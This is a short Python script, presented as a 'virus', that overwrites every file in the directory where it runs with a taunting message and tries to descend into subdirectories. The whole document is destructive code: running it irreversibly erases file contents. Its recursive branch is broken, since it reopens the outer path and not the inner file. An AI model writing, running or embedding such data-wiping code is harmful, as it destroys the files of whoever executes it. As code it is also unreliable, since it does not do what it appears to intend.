from glob import glob

for file in glob("*"):
    try:
        with open(file, "w+") as f:
            f.write("Hahahahaha. This is virus.")
    except:
        for fl in glob(file + "/" + "*"):
            try:
                with open(file, "w+") as f:
                    f.write("Hahahahah. This is a virus.")
            except: pass